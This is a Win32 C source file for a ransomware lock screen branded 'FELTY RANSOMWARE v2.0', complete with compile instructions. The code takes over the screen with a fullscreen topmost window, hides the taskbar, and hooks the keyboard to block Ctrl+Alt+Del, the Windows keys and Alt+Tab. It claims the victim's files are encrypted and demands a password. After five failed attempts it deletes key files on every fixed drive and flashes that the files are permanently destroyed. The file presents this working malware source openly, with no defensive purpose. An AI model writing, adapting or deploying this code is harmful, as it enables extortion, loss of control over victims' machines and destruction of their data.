/*
 * felty_binder.c — Native Win32 Fullscreen Lockscreen
 * No browser/HTML. Topmost window blocks all user interaction.
 * Petya-style red/black aesthetic with box-drawing logo.
 * Password: FELTY-RECOVER-2025 (5 attempts, then key destroyed + permanent flash)
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c \
 *       -lcrypt32 -ladvapi32 -lgdi32 -luser32 -mwindows
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#define PASSWORD        L"FELTY-RECOVER-2025"
#define MAX_TRIES       5
#define UNLOCK_FLAG     L"C:\\felty_unlocked.txt"

static volatile int g_attempts = 0;
static volatile int g_wipe     = 0;
static volatile int g_unlocked = 0;
static HWND g_hwnd  = NULL;
static HWND g_edit  = NULL;

/* Petya-style box-drawing ASCII art logo */
static const wchar_t *g_logo[] = {
    L"  \xDA\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xBF",
    L"  \xB3  FELTY RANSOMWARE v2.0  \xB3",
    L"  \xC0\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xD9",
};

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
        case WM_CREATE: {
            /* Remove window from Alt+Tab list */
            SetWindowLongPtrW(hwnd, GWL_EXSTYLE,
                GetWindowLongPtrW(hwnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
            break;
        }

        case WM_TIMER: {
            if (g_wipe) {
                /* Fast aggressive red/black flash every 150ms */
                static int flash_phase = 0;
                flash_phase = !flash_phase;
                HDC hdc = GetDC(hwnd);
                RECT rc;
                GetClientRect(hwnd, &rc);
                HBRUSH br = CreateSolidBrush(
                    flash_phase ? RGB(255, 0, 0) : RGB(0, 0, 0));
                FillRect(hdc, &rc, br);
                DeleteObject(br);

                /* Draw text on top during flash */
                SetBkMode(hdc, TRANSPARENT);
                HFONT hf = CreateFontW(rc.bottom / 16, 0, 0, 0, FW_BOLD, 0, 0, 0,
                    ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
                SelectObject(hdc, hf);
                SetTextColor(hdc, flash_phase ? RGB(0, 0, 0) : RGB(255, 51, 51));

                RECT tr;
                tr.left = rc.right / 4;
                tr.right = 3 * rc.right / 4;
                tr.top = rc.bottom / 3;
                tr.bottom = tr.top + rc.bottom / 8;
                DrawTextW(hdc, L"FILES PERMANENTLY DESTROYED", -1, &tr,
                    DT_CENTER | DT_VCENTER | DT_SINGLELINE);

                tr.top = tr.bottom + rc.bottom / 20;
                tr.bottom = tr.top + rc.bottom / 16;
                SelectObject(hdc, GetStockObject(SYSTEM_FIXED_FONT));
                SetTextColor(hdc, flash_phase ? RGB(0, 0, 0) : RGB(255, 100, 100));
                DrawTextW(hdc, L"NOTHING CAN RECOVER THEM", -1, &tr,
                    DT_CENTER | DT_VCENTER | DT_SINGLELINE);

                DeleteObject(hf);
                ReleaseDC(hwnd, hdc);
            }

            /* Keep window in foreground and focused */
            if (!g_unlocked && !g_wipe) {
                SetForegroundWindow(hwnd);
                SetFocus(g_edit);
                /* Re-topmost in case something tries to overlay */
                SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
            }
            break;
        }

        case WM_PAINT: {
            if (g_wipe) {
                /* Let timer handle flash */
                break;
            }

            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rc;
            GetClientRect(hwnd, &rc);

            /* Black background */
            HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(hdc, &rc, bg);
            DeleteObject(bg);

            SetBkMode(hdc, TRANSPARENT);

            /* Logo */
            HFONT hf_logo = CreateFontW(rc.bottom / 14, 0, 0, 0, FW_BOLD, 0, 0, 0,
                ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
            SelectObject(hdc, hf_logo);
            SetTextColor(hdc, RGB(255, 51, 51));

            int y = rc.bottom / 10;
            int line_h = rc.bottom / 18;
            for (int i = 0; i < 3; i++) {
                RECT tr = {rc.right / 4, y, 3 * rc.right / 4, y + line_h};
                DrawTextW(hdc, g_logo[i], -1, &tr, DT_LEFT | DT_TOP);
                y += rc.bottom / 22;
            }

            /* Status lines */
            HFONT hf_text = CreateFontW(rc.bottom / 22, 0, 0, 0, FW_NORMAL, 0, 0, 0,
                ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New");
            SelectObject(hdc, hf_text);

            const wchar_t *status_lines[] = {
                L"  >> SYSTEM LOCKED",
                L"  >> All your files have been encrypted.",
                L"  >> Enter the password below to unlock your system.",
            };
            y += rc.bottom / 30;
            for (int i = 0; i < 3; i++) {
                RECT tr = {rc.right / 4, y, 3 * rc.right / 4, y + line_h};
                DrawTextW(hdc, status_lines[i], -1, &tr, DT_LEFT | DT_TOP);
                y += rc.bottom / 24;
            }

            /* Attempts info */
            if (g_attempts > 0 && g_attempts < MAX_TRIES) {
                wchar_t eb[128];
                swprintf(eb, 128,
                    L"  // Wrong password. %d attempts remaining.",
                    MAX_TRIES - g_attempts);
                SetTextColor(hdc, RGB(255, 100, 100));
                RECT tr = {rc.right / 4, y + rc.bottom / 30,
                           3 * rc.right / 4, y + rc.bottom / 30 + line_h};
                DrawTextW(hdc, eb, -1, &tr, DT_LEFT | DT_TOP);
            } else if (g_attempts == 0) {
                SetTextColor(hdc, RGB(100, 100, 100));
                RECT tr = {rc.right / 4, y + rc.bottom / 30,
                           3 * rc.right / 4, y + rc.bottom / 30 + line_h};
                DrawTextW(hdc, L"  // Enter password and press ENTER", -1, &tr,
                    DT_LEFT | DT_TOP);
            }

            /* Draw password box border */
            HPEN pen = CreatePen(PS_SOLID, 2, RGB(255, 51, 51));
            SelectObject(hdc, pen);
            int box_x = rc.right / 2 - 161;
            int box_y = rc.bottom / 2 + rc.bottom / 20;
            RECT box = {box_x, box_y, box_x + 322, box_y + 42};
            HBRUSH br = CreateSolidBrush(RGB(26, 26, 26));
            FillRect(hdc, &box, br);
            FrameRect(hdc, &box, br);
            DeleteObject(br);
            SelectObject(hdc, GetStockObject(NULL_PEN));
            DeleteObject(pen);

            DeleteObject(hf_logo);
            DeleteObject(hf_text);
            EndPaint(hwnd, &ps);
            break;
        }

        case WM_CTLCOLOREDIT: {
            HDC hdc = (HDC)w;
            SetBkColor(hdc, RGB(26, 26, 26));
            SetTextColor(hdc, RGB(255, 255, 255));
            return (LRESULT)GetStockObject(BLACK_BRUSH);
        }

        case WM_CHAR: {
            if (w == VK_RETURN && !g_wipe && !g_unlocked) {
                wchar_t pw[256];
                GetWindowTextW(g_edit, pw, 256);

                if (wcscmp(pw, PASSWORD) == 0) {
                    g_unlocked = 1;
                    HANDLE hf = CreateFileW(UNLOCK_FLAG, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hf != INVALID_HANDLE_VALUE) {
                        DWORD dummy;
                        WriteFile(hf, L"UNLOCKED", 16, &dummy, NULL);
                        CloseHandle(hf);
                    }
                    DestroyWindow(hwnd);
                } else {
                    g_attempts++;
                    if (g_attempts >= MAX_TRIES) {
                        g_wipe = 1;
                        /* Destroy key files */
                        wchar_t syspath[MAX_PATH];
                        GetSystemDirectoryW(syspath, MAX_PATH);
                        wchar_t kp[MAX_PATH];
                        wcscpy(kp, syspath);
                        wcscat(kp, L"\\key.eky");
                        DeleteFileW(kp);

                        wchar_t d[256];
                        GetLogicalDriveStringsW(256, d);
                        wchar_t *dp = d;
                        while (*dp) {
                            if (GetDriveTypeW(dp) == DRIVE_FIXED) {
                                wcscpy(kp, dp); wcscat(kp, L".eky");
                                DeleteFileW(kp);
                            }
                            dp += wcslen(dp) + 1;
                        }

                        /* Disable edit box */
                        EnableWindow(g_edit, FALSE);
                        ShowWindow(g_edit, SW_HIDE);

                        /* Start flashing timer (150ms intervals = aggressive) */
                        SetTimer(hwnd, 2, 150, NULL);
                        InvalidateRect(hwnd, NULL, TRUE);
                    }
                    SetWindowTextW(g_edit, L"");
                    InvalidateRect(hwnd, NULL, TRUE);
                }
                return 0;
            }
            /* Block space and other input manipulation */
            if (w == VK_ESCAPE || w == VK_TAB) return 0;
            break;
        }

        case WM_KEYDOWN: {
            /* Block Alt+F4, Escape, Tab, Win keys */
            if (w == VK_ESCAPE || w == VK_F4 || w == VK_TAB ||
                w == VK_LWIN || w == VK_RWIN)
                return 0;
            break;
        }

        case WM_SYSKEYDOWN: {
            if (w == VK_F4 || w == VK_TAB) return 0;
            break;
        }

        case WM_CLOSE:
            return 0;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProcW(hwnd, msg, w, l);
    }
    return 0;
}

/* Block Ctrl+Alt+Del safely — install keyboard hook */
static HHOOK g_kb_hook = NULL;
static LRESULT CALLBACK KbProc(int code, WPARAM w, LPARAM l) {
    if (code >= 0) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)l;
        /* Block Ctrl+Alt+Del (VK_DELETE with Ctrl+Alt) */
        if (kb->vkCode == VK_DELETE &&
            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000)) {
            return 1;
        }
        /* Block Win keys, Alt+Tab, Alt+Esc */
        if (kb->vkCode == VK_LWIN || kb->vkCode == VK_RWIN) return 1;
        if (kb->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (kb->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
    }
    return CallNextHookEx(g_kb_hook, code, w, l);
}

/* Hide taskbar */
static void hide_taskbar(void) {
    HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
    if (hTaskBar) ShowWindow(hTaskBar, SW_HIDE);

    HWND hStart = FindWindowW(L"Button", NULL);
    if (hStart) {
        HWND hParent = GetParent(hStart);
        if (hParent) ShowWindow(hParent, SW_HIDE);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    /* Single instance */
    HANDLE hm = CreateMutexW(NULL, TRUE, L"Global\\FeltyBinderMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* Check if already unlocked */
    if (GetFileAttributesW(UNLOCK_FLAG) != INVALID_FILE_ATTRIBUTES) {
        CloseHandle(hm);
        return 0;
    }

    /* Hide taskbar */
    hide_taskbar();

    /* Install keyboard hook */
    g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, hInst, 0);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    /* Register window class */
    WNDCLASSW wc = {0};
    wc.style       = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance   = hInst;
    wc.hCursor     = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = NULL;
    wc.lpszClassName = L"FeltyBinderLock";
    RegisterClassW(&wc);

    /* Create fullscreen topmost window */
    g_hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
        L"FeltyBinderLock",
        L"Locked",
        WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh,
        NULL, NULL, hInst, NULL);

    /* Create password edit box */
    g_edit = CreateWindowExW(
        WS_EX_CLIENTEDGE,
        L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_CENTER | ES_AUTOHSCROLL,
        sw / 2 - 158, sh / 2 + sh / 20 + 1, 316, 38,
        g_hwnd, NULL, hInst, NULL);

    SendMessageW(g_edit, WM_SETFONT,
        (WPARAM)CreateFontW(18, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            ANSI_CHARSET, 0, 0, ANTIALIASED_QUALITY, 0, L"Courier New"),
        TRUE);

    /* Position and show */
    SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
    SetForegroundWindow(g_hwnd);
    SetFocus(g_edit);

    /* Timer to keep focus and drive repaints */
    SetTimer(g_hwnd, 1, 300, NULL);

    /* Disable all monitors — set the window as primary display */
    /* We can't truly disable monitors, but we can make this window fullscreen */
    ShowWindow(g_hwnd, SW_SHOWMAXIMIZED);

    /* Message loop */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (g_unlocked) break;
    }

    /* Cleanup */
    KillTimer(g_hwnd, 1);
    if (g_kb_hook) UnhookWindowsHookEx(g_kb_hook);

    /* Restore taskbar */
    HWND hTaskBar = FindWindowW(L"Shell_TrayWnd", NULL);
    if (hTaskBar) ShowWindow(hTaskBar, SW_SHOW);

    DestroyWindow(g_hwnd);
    CloseHandle(hm);
    return 0;
}
